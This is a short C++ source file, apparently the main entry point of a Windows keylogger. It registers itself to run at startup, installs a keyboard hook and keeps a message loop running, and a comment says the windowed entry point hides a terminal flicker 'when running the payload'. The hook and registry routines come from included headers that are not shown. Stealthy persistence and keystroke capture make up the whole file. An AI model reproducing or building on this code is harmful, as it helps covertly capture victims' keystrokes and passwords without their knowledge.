#include "util/keyboard.h"
#include "util/registry.h"
#include <Windows.h>

// The entry point for the application is a Windows subsystem to prevent a brief terminal 
// flicker when running the payload.
int APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE previous_instance,
	_In_ LPWSTR cmd_line, _In_ int cmd_show) {
	add_to_startup();
	set_keyboard_hook();

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0));
}
